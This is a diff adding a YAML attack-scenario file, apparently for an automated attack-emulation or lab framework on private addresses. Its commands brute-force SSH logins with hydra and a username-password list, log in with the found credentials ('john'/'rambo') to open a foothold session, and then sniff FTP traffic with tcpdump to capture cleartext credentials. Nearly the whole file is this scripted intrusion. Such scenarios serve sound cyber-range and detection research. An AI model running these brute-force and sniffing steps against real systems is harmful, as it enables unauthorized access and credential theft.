@@ -1,0 +1,39 @@
+####################
+#
+# Scenario 1 a a
+#
+####################
+vars:
+  $SERVER_ADDRESS: 192.42.0.254
+  $ATTACKER_ADDRESS: 192.42.1.174
+  $DNS_SERVER: 192.42.0.233
+
+commands:
+  - type: shell
+    cmd: hydra -C user_pass_combo.txt -s 10022 $SERVER_ADDRESS ssh  
+
+  - type: ssh
+    creates_session: foothold
+    username: john
+    password: rambo
+    hostname: $SERVER_ADDRESS
+    port: 10022
+    cmd: id
+
+  - type: ssh
+    session: foothold
+    cmd: "tcpdump -A port 21\n"
+    interactive: True
+
+  - type: ssh
+    session: foothold
+    cmd: "03"
+    interactive: True
+    bin: True
+
+  - type: ssh
+    session: foothold
+    cmd: "ps"
+
+  - type: sleep
+    seconds: 30
